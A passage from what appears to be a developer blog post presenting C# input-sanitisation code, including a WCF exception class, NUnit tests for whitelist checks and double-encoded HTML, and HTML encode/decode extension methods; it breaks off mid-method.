<figure class="code">
  <figcaption>Common.WcfHelpers.ErrorHandling.Exceptions.SanitisationWcfException</figcaption>

<div class="highlight"><pre><code></code><code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">System.Configuration</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">Common.WcfHelpers.ErrorHandling.Exceptions</code> <code class="p">{</code>
   <code class="c1">/// &lt;summary&gt;</code>
   <code class="c1">/// Exception class that is used when the user input sanitisation fails,</code>
   <code class="c1">/// and the user needs to be informed.</code>
   <code class="c1">/// &lt;/summary&gt;</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">SanitisationWcfException</code> <code class="p">:</code> <code class="n">WcfException</code> <code class="p">{</code>
      <code class="k">private</code> <code class="k">const</code> <code class="kt">string</code> <code class="n">_defaultMessageForClient</code> <code class="p">=</code>
         <code class="s">"Answers were NOT saved. User input validation was unsuccessful."</code><code class="p">;</code>
      <code class="k">public</code> <code class="kt">string</code> <code class="n">UnsanitisedAnswer</code> <code class="p">{</code> <code class="k">get</code><code class="p">;</code> <code class="k">private</code> <code class="k">set</code><code class="p">;</code> <code class="p">}</code>
 
      <code class="c1">/// &lt;summary&gt;</code>
      <code class="c1">/// In order to set the message for the client, set it here,</code>
      <code class="c1">/// or via the property directly in order to over ride default value.</code>
      <code class="c1">/// &lt;/summary&gt;</code>
      <code class="c1">/// &lt;param name="message"&gt;</code>
      <code class="c1">/// The message to be assigned to the Exception's Message.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="c1">/// &lt;param name="innerException"&gt;</code>
      <code class="c1">/// The Exception to be assigned to the base class instance's inner exception.</code>
      <code class="c1">/// This parameter is optional.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="c1">/// &lt;param name="messageForClient"&gt;</code>
      <code class="c1">/// The client friendly message. This parameter is optional, but should be set.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="c1">/// &lt;param name="unsanitisedAnswer"&gt;</code>
      <code class="c1">/// The user input string before service side sanitisatioin is performed.</code>
      <code class="c1">/// &lt;/param&gt;</code>
      <code class="k">public</code> <code class="nf">SanitisationWcfException</code> <code class="p">(</code>
         <code class="kt">string</code> <code class="n">message</code><code class="p">,</code>
         <code class="n">Exception</code> <code class="n">innerException</code> <code class="p">=</code> <code class="k">null</code><code class="p">,</code>
         <code class="kt">string</code> <code class="n">messageForClient</code> <code class="p">=</code> <code class="n">_defaultMessageForClient</code><code class="p">,</code>
         <code class="kt">string</code> <code class="n">unsanitisedAnswer</code> <code class="p">=</code> <code class="k">null</code>
      <code class="p">)</code> <code class="p">:</code> <code class="k">base</code> <code class="p">(</code>
         <code class="n">message</code><code class="p">,</code>
         <code class="n">innerException</code><code class="p">,</code>
         <code class="n">messageForClient</code> <code class="p">+</code>
         <code class="s">" If this continues to happen, please contact "</code> <code class="p">+</code>
         <code class="n">ConfigurationManager</code><code class="p">.</code><code class="n">AppSettings</code><code class="p">[</code><code class="s">"SupportEmail"</code><code class="p">]</code> <code class="p">+</code> <code class="n">Environment</code><code class="p">.</code><code class="n">NewLine</code>
      <code class="p">)</code> <code class="p">{</code>
         <code class="n">UnsanitisedAnswer</code> <code class="p">=</code> <code class="n">unsanitisedAnswer</code><code class="p">;</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>Now we defined whether our requirements were satisfied by way of executable requirements (unit tests(in their rawest form)):</p>

<figure class="code">
  <figcaption>Common.Security.Encoding.UnitTest.ExtensionsTest</figcaption>

<div class="highlight"><pre><code></code><code class="k">using</code> <code class="nn">NUnit.Framework</code><code class="p">;</code>
<code class="k">using</code> <code class="nn">Common.Security.Sanitisation</code><code class="p">;</code>

<code class="k">namespace</code> <code class="nn">Common.Security.Encoding.UnitTest</code> <code class="p">{</code>
<code class="na">   [TestFixture]</code>
   <code class="k">public</code> <code class="k">class</code> <code class="nc">ExtensionsTest</code> <code class="p">{</code>

      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">string</code> <code class="n">_inNeedOfEscaping</code> <code class="p">=</code>
         <code class="s">@"One #x2F / two amp &amp; three #x27 ' four lt &lt; five quot "" six gt &gt;."</code><code class="p">;</code>
      <code class="k">private</code> <code class="k">readonly</code> <code class="kt">string</code> <code class="n">_noNeedForEscaping</code> <code class="p">=</code>
         <code class="s">@"One x2F two amp three x27 four lt five quot six gt       ."</code><code class="p">;</code>
<code class="na">      </code>
<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">SingleDecodeDoubleEncodedHtml_ShouldSingleDecodeDoubleEncodedHtml</code><code class="p">()</code> <code class="p">{</code>
         <code class="kt">string</code> <code class="n">doubleEncodedHtml</code> <code class="p">=</code> <code class="s">@" &amp;amp;#x27; some text &amp;amp;#x2F; "</code><code class="p">;</code>
         <code class="kt">string</code> <code class="n">singleEncodedHtmlShouldLookLike</code> <code class="p">=</code> <code class="s">@" &amp;#x27; some text &amp;#x2F; "</code><code class="p">;</code>
         <code class="kt">string</code> <code class="n">singleEncodedHtml</code> <code class="p">=</code> <code class="n">doubleEncodedHtml</code><code class="p">.</code><code class="n">SingleDecodeDoubleEncodedHtml</code><code class="p">();</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code><code class="n">singleEncodedHtml</code><code class="p">,</code> <code class="n">Is</code><code class="p">.</code><code class="n">EqualTo</code><code class="p">(</code><code class="n">singleEncodedHtmlShouldLookLike</code><code class="p">));</code>
      <code class="p">}</code>
<code class="na"> </code>
<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Extensions_CompliesWithWhitelist_ShouldNotComply</code><code class="p">()</code> <code class="p">{</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code>
            <code class="n">_inNeedOfEscaping</code><code class="p">.</code><code class="n">CompliesWithWhitelist</code><code class="p">(</code><code class="n">whiteList</code><code class="p">:</code> <code class="s">@"^[\w\s\.,]+$"</code><code class="p">),</code>
            <code class="n">Is</code><code class="p">.</code><code class="n">False</code>
         <code class="p">);</code>
      <code class="p">}</code>
<code class="na"> </code>
<code class="na">      [Test]</code>
      <code class="k">public</code> <code class="k">void</code> <code class="nf">Extensions_CompliesWithWhitelist_ShouldComply</code><code class="p">()</code> <code class="p">{</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code>
            <code class="n">_noNeedForEscaping</code><code class="p">.</code><code class="n">CompliesWithWhitelist</code><code class="p">(</code><code class="n">whiteList</code><code class="p">:</code> <code class="s">@"^[\w\s\.,]+$"</code><code class="p">),</code>
            <code class="n">Is</code><code class="p">.</code><code class="n">True</code>
         <code class="p">);</code>
         <code class="n">Assert</code><code class="p">.</code><code class="n">That</code><code class="p">(</code>
            <code class="n">_inNeedOfEscaping</code><code class="p">.</code><code class="n">CompliesWithWhitelist</code><code class="p">(</code><code class="n">whiteList</code><code class="p">:</code> <code class="s">@"^[\w\s\.,#/&amp;'&lt;""&gt;]+$"</code><code class="p">),</code>
            <code class="n">Is</code><code class="p">.</code><code class="n">True</code>
         <code class="p">);</code>
      <code class="p">}</code>
   <code class="p">}</code>
<code class="p">}</code>
</pre></div>

</figure>

<p>Now the code that satisfies the above executable specifications, and more:</p>

<figure class="code">
  <figcaption>Common.Security.Sanitisation.Extensions</figcaption>

<div class="highlight"><pre><code></code><code class="lineno">  1 </code><code class="k">using</code> <code class="nn">System</code><code class="p">;</code>
<code class="lineno">  2 </code><code class="k">using</code> <code class="nn">System.Collections.Generic</code><code class="p">;</code>
<code class="lineno">  3 </code><code class="k">using</code> <code class="nn">System.Globalization</code><code class="p">;</code>
<code class="lineno">  4 </code><code class="k">using</code> <code class="nn">System.IO</code><code class="p">;</code>
<code class="lineno">  5 </code><code class="k">using</code> <code class="nn">System.Text.RegularExpressions</code><code class="p">;</code>
<code class="lineno">  6 </code>
<code class="lineno">  7 </code><code class="k">namespace</code> <code class="nn">Common.Security.Sanitisation</code> <code class="p">{</code>
<code class="lineno">  8 </code>   <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno">  9 </code>   <code class="c1">/// Provides a series of extension methods that perform sanitisation.</code>
<code class="lineno"> 10 </code>   <code class="c1">/// Escaping, unescaping, etc.</code>
<code class="lineno"> 11 </code>   <code class="c1">/// Usually targeted at user input,</code>
<code class="lineno"> 12 </code>   <code class="c1">/// to help defend against the likes of XSS and other injection attacks.</code>
<code class="lineno"> 13 </code>   <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno"> 14 </code>   <code class="k">public</code> <code class="k">static</code> <code class="k">class</code> <code class="nc">Extensions</code> <code class="p">{</code>
<code class="lineno"> 15 </code>   
<code class="lineno"> 16 </code>      <code class="k">private</code> <code class="k">const</code> <code class="kt">int</code> <code class="n">CharacterIndexNotFound</code> <code class="p">=</code> <code class="p">-</code><code class="m">1</code><code class="p">;</code>
<code class="lineno"> 17 </code>   
<code class="lineno"> 18 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno"> 19 </code>      <code class="c1">/// Returns a new string in which all occurrences of a double escaped html character</code>
<code class="lineno"> 20 </code>      <code class="c1">/// (that's an html entity immediatly prefixed with another html entity)</code>
<code class="lineno"> 21 </code>      <code class="c1">/// in the current instance are replaced with the single escaped character.</code>
<code class="lineno"> 22 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno"> 23 </code>      <code class="c1">/// &lt;param name="source"&gt;</code>
<code class="lineno"> 24 </code>      <code class="c1">/// The target text used to strip one layer of Html entity encoding.</code>
<code class="lineno"> 25 </code>      <code class="c1">/// &lt;/param&gt;</code>
<code class="lineno"> 26 </code>      <code class="c1">/// &lt;returns&gt;The singly escaped text.&lt;/returns&gt;</code>
<code class="lineno"> 27 </code>      <code class="k">public</code> <code class="k">static</code> <code class="kt">string</code> <code class="nf">SingleDecodeDoubleEncodedHtml</code><code class="p">(</code><code class="k">this</code> <code class="kt">string</code> <code class="n">source</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 28 </code>         <code class="k">return</code> <code class="n">source</code><code class="p">.</code><code class="n">Replace</code><code class="p">(</code><code class="s">"&amp;amp;#x"</code><code class="p">,</code> <code class="s">"&amp;#x"</code><code class="p">);</code>
<code class="lineno"> 29 </code>      <code class="p">}</code>
<code class="lineno"> 30 </code>
<code class="lineno"> 31 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno"> 32 </code>      <code class="c1">/// Filter a text against a regular expression whitelist of specified characters.</code>
<code class="lineno"> 33 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno"> 34 </code>      <code class="c1">/// &lt;param name="target"&gt;The text that is filtered using the whitelist.&lt;/param&gt;</code>
<code class="lineno"> 35 </code>      <code class="c1">/// &lt;param name="alternativeTarget"&gt;&lt;/param&gt;</code>
<code class="lineno"> 36 </code>      <code class="c1">/// &lt;param name="whiteList"&gt;</code>
<code class="lineno"> 37 </code>      <code class="c1">/// Needs to be be assigned a valid whitelist, otherwise nothing gets through.</code>
<code class="lineno"> 38 </code>      <code class="c1">/// &lt;/param&gt;</code>
<code class="lineno"> 39 </code>      <code class="k">public</code> <code class="k">static</code> <code class="kt">bool</code> <code class="nf">CompliesWithWhitelist</code><code class="p">(</code>
<code class="lineno"> 40 </code>         <code class="k">this</code> <code class="kt">string</code> <code class="n">target</code><code class="p">,</code> <code class="kt">string</code> <code class="n">alternativeTarget</code> <code class="p">=</code> <code class="s">""</code><code class="p">,</code> <code class="kt">string</code> <code class="n">whiteList</code> <code class="p">=</code> <code class="s">""</code>
<code class="lineno"> 41 </code>      <code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 42 </code>         <code class="k">if</code> <code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">target</code><code class="p">))</code>
<code class="lineno"> 43 </code>            <code class="n">target</code> <code class="p">=</code> <code class="n">alternativeTarget</code><code class="p">;</code>
<code class="lineno"> 44 </code> 
<code class="lineno"> 45 </code>         <code class="k">return</code> <code class="n">Regex</code><code class="p">.</code><code class="n">IsMatch</code><code class="p">(</code><code class="n">target</code><code class="p">,</code> <code class="n">whiteList</code><code class="p">);</code>
<code class="lineno"> 46 </code>      <code class="p">}</code>
<code class="lineno"> 47 </code>
<code class="lineno"> 48 </code>      <code class="c1">// Warning!</code>
<code class="lineno"> 49 </code>      <code class="c1">// The following code is not pretty, it came from System.Net.WebUtility.</code>
<code class="lineno"> 50 </code>
<code class="lineno"> 51 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno"> 52 </code>      <code class="c1">/// Takes a string and returns another with a single layer of</code>
<code class="lineno"> 53 </code>      <code class="c1">/// Html entity encoding replaced with it's Html entity literals.</code>
<code class="lineno"> 54 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno"> 55 </code>      <code class="c1">/// &lt;param name="encodedUserInput"&gt;</code>
<code class="lineno"> 56 </code>      <code class="c1">/// The text to perform the opperation on.</code>
<code class="lineno"> 57 </code>      <code class="c1">/// &lt;/param&gt;</code>
<code class="lineno"> 58 </code>      <code class="c1">/// &lt;param name="numberOfEscapes"&gt;</code>
<code class="lineno"> 59 </code>      <code class="c1">/// The number of Html entity encodings that were replaced.</code>
<code class="lineno"> 60 </code>      <code class="c1">/// &lt;/param&gt;</code>
<code class="lineno"> 61 </code>      <code class="c1">/// &lt;returns&gt;</code>
<code class="lineno"> 62 </code>      <code class="c1">/// The text that's had a single layer of Html entity encoding</code>
<code class="lineno"> 63 </code>      <code class="c1">/// replaced with it's Html entity literals.</code>
<code class="lineno"> 64 </code>      <code class="c1">/// &lt;/returns&gt;</code>
<code class="lineno"> 65 </code>      <code class="k">public</code> <code class="k">static</code> <code class="kt">string</code> <code class="nf">HtmlDecode</code><code class="p">(</code>
<code class="lineno"> 66 </code>         <code class="k">this</code> <code class="kt">string</code> <code class="n">encodedUserInput</code><code class="p">,</code> <code class="k">ref</code> <code class="kt">int</code> <code class="n">numberOfEscapes</code>
<code class="lineno"> 67 </code>      <code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 68 </code>         <code class="k">const</code> <code class="kt">int</code> <code class="n">NotFound</code> <code class="p">=</code> <code class="p">-</code><code class="m">1</code><code class="p">;</code>
<code class="lineno"> 69 </code>      
<code class="lineno"> 70 </code>         <code class="k">if</code> <code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">encodedUserInput</code><code class="p">))</code>
<code class="lineno"> 71 </code>            <code class="k">return</code> <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">;</code>
<code class="lineno"> 72 </code>   
<code class="lineno"> 73 </code>         <code class="n">StringWriter</code> <code class="n">output</code> <code class="p">=</code> <code class="k">new</code> <code class="n">StringWriter</code><code class="p">(</code><code class="n">CultureInfo</code><code class="p">.</code><code class="n">InvariantCulture</code><code class="p">);</code>
<code class="lineno"> 74 </code>      
<code class="lineno"> 75 </code>         <code class="k">if</code> <code class="p">(</code><code class="n">encodedUserInput</code><code class="p">.</code><code class="n">IndexOf</code><code class="p">(</code><code class="sc">'&amp;'</code><code class="p">)</code> <code class="p">==</code> <code class="n">NotFound</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 76 </code>            <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">encodedUserInput</code><code class="p">);</code>
<code class="lineno"> 77 </code>         <code class="p">}</code> <code class="k">else</code> <code class="p">{</code>
<code class="lineno"> 78 </code>            <code class="kt">int</code> <code class="n">length</code> <code class="p">=</code> <code class="n">encodedUserInput</code><code class="p">.</code><code class="n">Length</code><code class="p">;</code>
<code class="lineno"> 79 </code>            <code class="k">for</code> <code class="p">(</code><code class="kt">int</code> <code class="n">index1</code> <code class="p">=</code> <code class="m">0</code><code class="p">;</code> <code class="n">index1</code> <code class="p">&lt;</code> <code class="n">length</code><code class="p">;</code> <code class="p">++</code><code class="n">index1</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 80 </code>               <code class="kt">char</code> <code class="n">ch1</code> <code class="p">=</code> <code class="n">encodedUserInput</code><code class="p">[</code><code class="n">index1</code><code class="p">];</code>
<code class="lineno"> 81 </code>               <code class="k">if</code> <code class="p">(</code><code class="n">ch1</code> <code class="p">==</code> <code class="m">38</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 82 </code>                  <code class="kt">int</code> <code class="n">index2</code> <code class="p">=</code> <code class="n">encodedUserInput</code><code class="p">.</code><code class="n">IndexOfAny</code><code class="p">(</code>
<code class="lineno"> 83 </code>                     <code class="n">_htmlEntityEndingChars</code><code class="p">,</code> <code class="n">index1</code> <code class="p">+</code> <code class="m">1</code>
<code class="lineno"> 84 </code>                  <code class="p">);</code>
<code class="lineno"> 85 </code>                  <code class="k">if</code> <code class="p">(</code><code class="n">index2</code> <code class="p">&gt;</code> <code class="m">0</code> <code class="p">&amp;&amp;</code> <code class="n">encodedUserInput</code><code class="p">[</code><code class="n">index2</code><code class="p">]</code> <code class="p">==</code> <code class="m">59</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 86 </code>                     <code class="kt">string</code> <code class="n">entity</code> <code class="p">=</code> <code class="n">encodedUserInput</code><code class="p">.</code><code class="n">Substring</code><code class="p">(</code>
<code class="lineno"> 87 </code>                        <code class="n">index1</code> <code class="p">+</code> <code class="m">1</code><code class="p">,</code> <code class="n">index2</code> <code class="p">-</code> <code class="n">index1</code> <code class="p">-</code> <code class="m">1</code>
<code class="lineno"> 88 </code>                     <code class="p">);</code>
<code class="lineno"> 89 </code>                     <code class="k">if</code> <code class="p">(</code><code class="n">entity</code><code class="p">.</code><code class="n">Length</code> <code class="p">&gt;</code> <code class="m">1</code> <code class="p">&amp;&amp;</code> <code class="n">entity</code><code class="p">[</code><code class="m">0</code><code class="p">]</code> <code class="p">==</code> <code class="m">35</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno"> 90 </code>                        <code class="kt">ushort</code> <code class="n">result</code><code class="p">;</code>
<code class="lineno"> 91 </code>                        <code class="k">if</code> <code class="p">(</code><code class="n">entity</code><code class="p">[</code><code class="m">1</code><code class="p">]</code> <code class="p">==</code> <code class="m">120</code> <code class="p">||</code> <code class="n">entity</code><code class="p">[</code><code class="m">1</code><code class="p">]</code> <code class="p">==</code> <code class="m">88</code><code class="p">)</code>
<code class="lineno"> 92 </code>                           <code class="kt">ushort</code><code class="p">.</code><code class="n">TryParse</code><code class="p">(</code>
<code class="lineno"> 93 </code>                              <code class="n">entity</code><code class="p">.</code><code class="n">Substring</code><code class="p">(</code><code class="m">2</code><code class="p">),</code>
<code class="lineno"> 94 </code>                              <code class="n">NumberStyles</code><code class="p">.</code><code class="n">AllowHexSpecifier</code><code class="p">,</code>
<code class="lineno"> 95 </code>                              <code class="n">NumberFormatInfo</code><code class="p">.</code><code class="n">InvariantInfo</code><code class="p">,</code>
<code class="lineno"> 96 </code>                              <code class="k">out</code> <code class="n">result</code>
<code class="lineno"> 97 </code>                           <code class="p">);</code>
<code class="lineno"> 98 </code>                        <code class="k">else</code>
<code class="lineno"> 99 </code>                           <code class="kt">ushort</code><code class="p">.</code><code class="n">TryParse</code><code class="p">(</code>
<code class="lineno">100 </code>                              <code class="n">entity</code><code class="p">.</code><code class="n">Substring</code><code class="p">(</code><code class="m">1</code><code class="p">),</code>
<code class="lineno">101 </code>                              <code class="n">NumberStyles</code><code class="p">.</code><code class="n">AllowLeadingWhite</code> <code class="p">|</code>
<code class="lineno">102 </code>                              <code class="n">NumberStyles</code><code class="p">.</code><code class="n">AllowTrailingWhite</code> <code class="p">|</code>
<code class="lineno">103 </code>                              <code class="n">NumberStyles</code><code class="p">.</code><code class="n">AllowLeadingSign</code><code class="p">,</code>
<code class="lineno">104 </code>                              <code class="n">NumberFormatInfo</code><code class="p">.</code><code class="n">InvariantInfo</code><code class="p">,</code>
<code class="lineno">105 </code>                              <code class="k">out</code> <code class="n">result</code>
<code class="lineno">106 </code>                           <code class="p">);</code>
<code class="lineno">107 </code>                        <code class="k">if</code> <code class="p">(</code><code class="n">result</code> <code class="p">!=</code> <code class="m">0</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">108 </code>                           <code class="n">ch1</code> <code class="p">=</code> <code class="p">(</code><code class="kt">char</code><code class="p">)</code><code class="n">result</code><code class="p">;</code>
<code class="lineno">109 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">110 </code>                           <code class="n">index1</code> <code class="p">=</code> <code class="n">index2</code><code class="p">;</code>
<code class="lineno">111 </code>                        <code class="p">}</code>
<code class="lineno">112 </code>                     <code class="p">}</code> <code class="k">else</code> <code class="p">{</code>
<code class="lineno">113 </code>                        <code class="n">index1</code> <code class="p">=</code> <code class="n">index2</code><code class="p">;</code>
<code class="lineno">114 </code>                        <code class="kt">char</code> <code class="n">ch2</code> <code class="p">=</code> <code class="n">HtmlEntities</code><code class="p">.</code><code class="n">Lookup</code><code class="p">(</code><code class="n">entity</code><code class="p">);</code>
<code class="lineno">115 </code>                        <code class="k">if</code> <code class="p">((</code><code class="kt">int</code><code class="p">)</code><code class="n">ch2</code> <code class="p">!=</code> <code class="m">0</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">116 </code>                           <code class="n">ch1</code> <code class="p">=</code> <code class="n">ch2</code><code class="p">;</code>
<code class="lineno">117 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">118 </code>                        <code class="p">}</code> <code class="k">else</code> <code class="p">{</code>
<code class="lineno">119 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="sc">'&amp;'</code><code class="p">);</code>
<code class="lineno">120 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">entity</code><code class="p">);</code>
<code class="lineno">121 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="sc">';'</code><code class="p">);</code>
<code class="lineno">122 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">123 </code>                        <code class="p">}</code>
<code class="lineno">124 </code>                     <code class="p">}</code>
<code class="lineno">125 </code>                  <code class="p">}</code>
<code class="lineno">126 </code>               <code class="p">}</code>
<code class="lineno">127 </code>               <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">ch1</code><code class="p">);</code>
<code class="lineno">128 </code>            <code class="p">}</code>
<code class="lineno">129 </code>         <code class="p">}</code>
<code class="lineno">130 </code>         <code class="kt">string</code> <code class="n">decodedHtml</code> <code class="p">=</code> <code class="n">output</code><code class="p">.</code><code class="n">ToString</code><code class="p">();</code>
<code class="lineno">131 </code>         <code class="n">output</code><code class="p">.</code><code class="n">Dispose</code><code class="p">();</code>
<code class="lineno">132 </code>         <code class="k">return</code> <code class="n">decodedHtml</code><code class="p">;</code>
<code class="lineno">133 </code>      <code class="p">}</code>
<code class="lineno">134 </code>
<code class="lineno">135 </code>      <code class="c1">/// &lt;summary&gt;</code>
<code class="lineno">136 </code>      <code class="c1">/// Escapes all character entity references (double escaping where necessary).</code>
<code class="lineno">137 </code>      <code class="c1">/// Why? The XmlTextReader that is setup in XmlDocument.LoadXml on the service</code>
<code class="lineno">138 </code>      <code class="c1">/// considers the character entity references (&amp;#xxxx;)</code>
<code class="lineno">139 </code>      <code class="c1">/// to be the character they represent.</code>
<code class="lineno">140 </code>      <code class="c1">/// All XML is converted to unicode on reading and any such entities are removed</code>
<code class="lineno">141 </code>      <code class="c1">/// in favor of the unicode character they represent.</code>
<code class="lineno">142 </code>      <code class="c1">/// &lt;/summary&gt;</code>
<code class="lineno">143 </code>      <code class="c1">/// &lt;param name="unencodedUserInput"&gt;The string that needs to be escaped.&lt;/param&gt;</code>
<code class="lineno">144 </code>      <code class="c1">/// &lt;param name="numberOfEscapes"&gt;The number of escapes applied.&lt;/param&gt;</code>
<code class="lineno">145 </code>      <code class="c1">/// &lt;returns&gt;The escaped text.&lt;/returns&gt;</code>
<code class="lineno">146 </code>      <code class="k">public</code> <code class="k">static</code> <code class="k">unsafe</code> <code class="kt">string</code> <code class="nf">HtmlEncode</code><code class="p">(</code>
<code class="lineno">147 </code>         <code class="k">this</code> <code class="kt">string</code> <code class="n">unencodedUserInput</code><code class="p">,</code>
<code class="lineno">148 </code>         <code class="k">ref</code> <code class="kt">int</code> <code class="n">numberOfEscapes</code>
<code class="lineno">149 </code>      <code class="p">)</code> <code class="p">{</code>
<code class="lineno">150 </code>         <code class="k">if</code> <code class="p">(</code><code class="kt">string</code><code class="p">.</code><code class="n">IsNullOrEmpty</code><code class="p">(</code><code class="n">unencodedUserInput</code><code class="p">))</code>
<code class="lineno">151 </code>            <code class="k">return</code> <code class="kt">string</code><code class="p">.</code><code class="n">Empty</code><code class="p">;</code>
<code class="lineno">152 </code>       
<code class="lineno">153 </code>         <code class="n">StringWriter</code> <code class="n">output</code> <code class="p">=</code> <code class="k">new</code> <code class="n">StringWriter</code><code class="p">(</code><code class="n">CultureInfo</code><code class="p">.</code><code class="n">InvariantCulture</code><code class="p">);</code>
<code class="lineno">154 </code>          
<code class="lineno">155 </code>         <code class="k">if</code> <code class="p">(</code><code class="n">output</code> <code class="p">==</code> <code class="k">null</code><code class="p">)</code>
<code class="lineno">156 </code>            <code class="k">throw</code> <code class="k">new</code> <code class="nf">ArgumentNullException</code><code class="p">(</code><code class="s">"output"</code><code class="p">);</code>
<code class="lineno">157 </code>         <code class="kt">int</code> <code class="n">num1</code> <code class="p">=</code> <code class="n">IndexOfHtmlEncodingChars</code><code class="p">(</code><code class="n">unencodedUserInput</code><code class="p">);</code>
<code class="lineno">158 </code>         <code class="k">if</code> <code class="p">(</code><code class="n">num1</code> <code class="p">==</code> <code class="p">-</code><code class="m">1</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">159 </code>            <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="n">unencodedUserInput</code><code class="p">);</code>
<code class="lineno">160 </code>         <code class="p">}</code> <code class="k">else</code> <code class="p">{</code>
<code class="lineno">161 </code>            <code class="kt">int</code> <code class="n">num2</code> <code class="p">=</code> <code class="n">unencodedUserInput</code><code class="p">.</code><code class="n">Length</code> <code class="p">-</code> <code class="n">num1</code><code class="p">;</code>
<code class="lineno">162 </code>            <code class="k">fixed</code> <code class="p">(</code><code class="kt">char</code><code class="p">*</code> <code class="n">chPtr1</code> <code class="p">=</code> <code class="n">unencodedUserInput</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">163 </code>               <code class="kt">char</code><code class="p">*</code> <code class="n">chPtr2</code> <code class="p">=</code> <code class="n">chPtr1</code><code class="p">;</code>
<code class="lineno">164 </code>               <code class="k">while</code> <code class="p">(</code><code class="n">num1</code><code class="p">--</code> <code class="p">&gt;</code> <code class="m">0</code><code class="p">)</code>
<code class="lineno">165 </code>                  <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(*</code><code class="n">chPtr2</code><code class="p">++);</code>
<code class="lineno">166 </code>               <code class="k">while</code> <code class="p">(</code><code class="n">num2</code><code class="p">--</code> <code class="p">&gt;</code> <code class="m">0</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">167 </code>                  <code class="kt">char</code> <code class="n">ch</code> <code class="p">=</code> <code class="p">*</code><code class="n">chPtr2</code><code class="p">++;</code>
<code class="lineno">168 </code>                  <code class="k">if</code> <code class="p">(</code><code class="n">ch</code> <code class="p">&lt;=</code> <code class="m">62</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">169 </code>                     <code class="k">switch</code> <code class="p">(</code><code class="n">ch</code><code class="p">)</code> <code class="p">{</code>
<code class="lineno">170 </code>                        <code class="k">case</code> <code class="sc">'"'</code><code class="p">:</code>
<code class="lineno">171 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;quot;"</code><code class="p">);</code>
<code class="lineno">172 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">173 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">174 </code>                        <code class="k">case</code> <code class="sc">'&amp;'</code><code class="p">:</code>
<code class="lineno">175 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;amp;"</code><code class="p">);</code>
<code class="lineno">176 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">177 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">178 </code>                        <code class="k">case</code> <code class="sc">'\''</code><code class="p">:</code>
<code class="lineno">179 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;amp;#x27;"</code><code class="p">);</code>
<code class="lineno">180 </code>                           <code class="n">numberOfEscapes</code> <code class="p">=</code> <code class="n">numberOfEscapes</code> <code class="p">+</code> <code class="m">2</code><code class="p">;</code>
<code class="lineno">181 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">182 </code>                        <code class="k">case</code> <code class="sc">'&lt;'</code><code class="p">:</code>
<code class="lineno">183 </code>                           <code class="n">output</code><code class="p">.</code><code class="n">Write</code><code class="p">(</code><code class="s">"&amp;lt;"</code><code class="p">);</code>
<code class="lineno">184 </code>                           <code class="n">numberOfEscapes</code><code class="p">++;</code>
<code class="lineno">185 </code>                           <code class="k">continue</code><code class="p">;</code>
<code class="lineno">186 </code>                        <code class="k">case</code> <code class="sc">'&gt;'</code><code class="p">:</code>
